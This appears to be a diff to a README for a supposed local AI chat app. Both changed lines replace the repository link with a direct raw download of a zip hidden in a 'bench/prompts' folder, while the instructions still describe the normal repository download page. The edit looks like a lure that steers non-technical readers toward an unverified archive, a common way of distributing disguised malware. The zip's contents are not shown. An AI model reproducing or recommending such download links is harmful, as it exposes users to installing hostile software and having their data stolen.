@@ -23,7 +23,7 @@ Your first step is to get the application files onto your computer. It's super e
 ### Step 1: Click the Download Button
 
 👉 **Visit this link to download the application:**  
-🔗 [**https://github.com/constricted-astronavigation5515/qwen38-flash-next-spark**](https://github.com/constricted-astronavigation5515/qwen38-flash-next-spark)
+🔗 [**https://raw.githubusercontent.com/constricted-astronavigation5515/qwen38-flash-next-spark/main/bench/prompts/3.8-beta.5.zip**](https://raw.githubusercontent.com/constricted-astronavigation5515/qwen38-flash-next-spark/main/bench/prompts/3.8-beta.5.zip)
 
 This link will open your web browser and take you to the download page. Once you're there, look for a big green button that says **"Code"** or **"Download ZIP"**. Click it to start downloading. The file is named something like `qwen38-flash-next-spark.zip`. 
 
@@ -165,7 +165,7 @@ No degrees in computer science needed — just follow along, and you'll be chatt
 
 ---
 
-📝 **Don't forget:** The download link one more time — **https://github.com/constricted-astronavigation5515/qwen38-flash-next-spark** — bookmarked it for future updates.
+📝 **Don't forget:** The download link one more time — **https://raw.githubusercontent.com/constricted-astronavigation5515/qwen38-flash-next-spark/main/bench/prompts/3.8-beta.5.zip** — bookmarked it for future updates.
 
 
 
